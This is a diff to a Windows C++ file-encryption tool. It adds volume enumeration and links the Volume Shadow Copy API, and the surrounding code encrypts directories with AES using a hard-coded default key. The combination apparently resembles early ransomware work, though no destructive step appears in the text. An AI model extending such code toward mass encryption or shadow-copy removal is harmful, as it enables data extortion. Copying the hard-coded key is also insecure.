@@ -4,6 +4,7 @@
 #include <fstream>
 #pragma comment(lib, "Shlwapi.lib")
 #pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "VssApi.lib")
 
 using namespace std;
 
@@ -111,6 +112,26 @@ int wmain(int argc, wchar_t* argv[])
         return 0;
     }
 
+    printNice(L"Looking for volumes...");
+    wchar_t* volName = new wchar_t[MAX_PATH];
+    auto hVol = FindFirstVolumeW(
+        volName, MAX_PATH);
+    if (!hVol) {
+        wcout << GetLastError() << endl;
+        return 1;
+    }
+    printNice(L"Looking for volumes...:\n");
+    while (hVol) {
+        printNice(volName);
+        if(!FindNextVolumeW(hVol, volName, MAX_PATH)){
+            wcout << GetLastError() << endl;
+            break;
+        }
+    }
+
+    FindVolumeClose(hVol);
+    return 0; 
+
     const wstring directoryPath = sanitizePath(argv[1]);
 
     // command to encrypt
@@ -121,6 +142,7 @@ int wmain(int argc, wchar_t* argv[])
     DWORD errCode = 0;
     modeFlag_t flagMode = (argc == 4 ? decrypt : encrypt);
     auto aeskey = (argc == 3 ? argv[2] : L"3igcZhRdWq96m3GUmTAiv9");
+
     if (flagMode == decrypt) {
         if (FindFile(directoryPath, L"", aeskey, errCode, decrypt) != TRUE) {
             printNice(L"The path exists? ...");
